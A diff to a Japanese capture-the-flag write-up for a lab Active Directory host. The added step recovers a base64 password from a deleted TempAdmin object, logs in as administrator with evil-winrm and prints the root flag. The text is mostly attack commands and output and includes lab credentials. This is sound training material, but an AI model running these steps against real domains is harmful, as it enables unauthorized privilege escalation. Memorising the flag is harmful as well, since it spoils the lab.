@@ -611,21 +611,21 @@ Audit$をダウンロード
 └─$ smbget --recursive -U 'cicade.local/s.smith%sT333ve2' smb://10.129.93.212/Audit$
 Using domain: CICADE.LOCAL, user: s.smith
 Using domain: CICADE.LOCAL, user: s.smith
-smb://10.129.93.212/Audit$/CascAudit.exe                                                                                                                                        
+smb://10.129.93.212/Audit$/CascAudit.exe  
 Using domain: CICADE.LOCAL, user: s.smith
-smb://10.129.93.212/Audit$/CascCrypto.dll                                                                                                                                       
-Using domain: CICADE.LOCAL, user: s.smith
-Using domain: CICADE.LOCAL, user: s.smith
-smb://10.129.93.212/Audit$/DB/Audit.db                                                                                                                                          
-Using domain: CICADE.LOCAL, user: s.smith
-smb://10.129.93.212/Audit$/RunAudit.bat                                                                                                                                         
-Using domain: CICADE.LOCAL, user: s.smith
-smb://10.129.93.212/Audit$/System.Data.SQLite.dll                                                                                                                               
-Using domain: CICADE.LOCAL, user: s.smith
-smb://10.129.93.212/Audit$/System.Data.SQLite.EF6.dll                                                                                                                           
+smb://10.129.93.212/Audit$/CascCrypto.dll 
 Using domain: CICADE.LOCAL, user: s.smith
 Using domain: CICADE.LOCAL, user: s.smith
-smb://10.129.93.212/Audit$/x64/SQLite.Interop.dll                                                                                                                               
+smb://10.129.93.212/Audit$/DB/Audit.db    
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/RunAudit.bat   
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/System.Data.SQLite.dll
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/System.Data.SQLite.EF6.dll
+Using domain: CICADE.LOCAL, user: s.smith
+Using domain: CICADE.LOCAL, user: s.smith
+smb://10.129.93.212/Audit$/x64/SQLite.Interop.dll    
 Using domain: CICADE.LOCAL, user: s.smith
 Using domain: CICADE.LOCAL, user: s.smith
 smb://10.129.93.212/Audit$/x86/SQLite.Interop.dll                                                                                                                               
@@ -683,3 +683,83 @@ Info: Establishing connection to remote endpoint
 
 
 ## STEP 6
+「AD Recycle Bin」メンバーを侵害したので削除済オブジェクト内に権限昇格の手がかりがあるか探す  
+TempAdminというオブジェクトが怪しい
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -LDAPFilter '(DistinguishedName=*)' -IncludeDeletedObjects -SearchBase 'CN=Deleted Objects,DC=cascade,DC=local' | Select-Object DistinguishedName
+
+DistinguishedName
+-----------------
+CN=Deleted Objects,DC=cascade,DC=local
+CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+```
+TempAdminを確認すると、STEP2でも確認できたcascadeLegacyPwd属性を発見
+```powershell
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -LDAPFilter '(sAMAccountName=TempAdmin)' -IncludeDeletedObjects -Property * -SearchBase 'CN=Deleted Objects,DC=cascade,DC=local'
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+```
+base64デコードでadministratorログイン成功！ルートフラグゲット
+```powershell
+└─$ evil-winrm -i 10.129.93.212 -u administrator -p $(echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d) 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
+3256a57a4e6f7212f2f2f4fabfc8261e
+```
